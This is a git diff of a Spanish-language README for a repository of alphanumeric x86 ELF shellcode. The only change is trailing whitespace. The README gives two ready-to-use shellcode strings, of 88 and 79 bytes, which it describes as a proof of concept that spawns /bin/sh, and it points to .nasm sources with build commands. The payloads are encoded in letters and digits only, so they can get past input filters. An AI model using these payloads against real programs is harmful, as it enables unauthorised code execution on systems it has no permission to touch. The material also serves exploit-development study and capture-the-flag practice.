@@ -1,7 +1,7 @@
 # Shellcode-alfanumerico---Spawn-bin-sh-elf-x86-
 PoC Shellcode alfanumerico (Solo numeros y letras (mayúsculas y minúsculas)) para invocar un /bin/sh, ELF x86.  
   
-Shellcode (88 bytes): `HHDDDDfj0Y0H0fhzzYAAAAAA0HX0hY0HYDPhu12ZX5ZBZZlPhu834X5ZZZZPTYhjaaaX5aaaaP4a4jPPQTUVWaMz`
+Shellcode (88 bytes): `HHDDDDfj0Y0H0fhzzYAAAAAA0HX0hY0HYDPhu12ZX5ZBZZlPhu834X5ZZZZPTYhjaaaX5aaaaP4a4jPPQTUVWaMz`  
 Shellcode PoC (79 bytes): `hzzzzYAAAAAA0HM0hN0HNhu12ZX5ZBZZPhu834X5ZZZZPTYhjaaaX5aaaaP5aaaa5jaaaPPQTUVWaMz`  
   
 Los archivos .nasm tienen el código de cada shellcode junto a su comando para compilarlos.  
